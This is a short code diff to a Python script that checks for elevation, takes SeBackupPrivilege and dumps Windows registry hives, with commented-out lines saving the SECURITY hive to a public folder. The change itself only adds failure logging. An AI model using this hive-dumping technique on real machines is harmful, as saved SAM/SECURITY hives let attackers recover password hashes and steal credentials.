@@ -47,10 +47,14 @@ def dumpreg():
     #securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS);
     #win32api.RegSaveKey(securityhandle, "c:\\users\\public\\security.save", None);
     #win32api.RegCloseKey(securityhandle);
-
+f = open("c:/users/public/dumpy_log.log", "a")
 if not ElevatedorNot():
+    f.write("not elevated...\n")
     exit()
 if not SetBackupPrivilege():
+    f.write("could not get seBackupPrivilege...\n")
     exit()
 if not dumpreg():
+    f.write("couldn't dump registry...\n")
     exit()
+f.close()
